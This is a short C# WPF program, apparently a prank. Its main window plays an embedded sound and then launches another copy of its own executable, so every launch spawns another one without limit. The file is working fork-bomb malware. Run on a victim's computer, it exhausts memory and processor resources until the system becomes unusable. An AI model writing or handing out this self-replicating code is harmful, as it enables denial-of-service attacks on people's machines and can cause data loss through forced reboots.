using System;
using System.IO;
using System.Media;
using System.Windows;
using System.Diagnostics;

namespace Bruh {
	public partial class MainWindow : Window {
		// hacky thing
		string longboi = "";

		public MainWindow() {
            InitializeComponent();

			new SoundPlayer(new MemoryStream(Convert.FromBase64String(longboi))).Play();

			try {
				Process newbruh = new Process();
				newbruh.StartInfo.FileName = System.Reflection.Assembly.GetEntryAssembly().Location;
				newbruh.Start();
			} catch (Exception e) {
				Console.WriteLine(e.Message);
			}
		}
	}
}
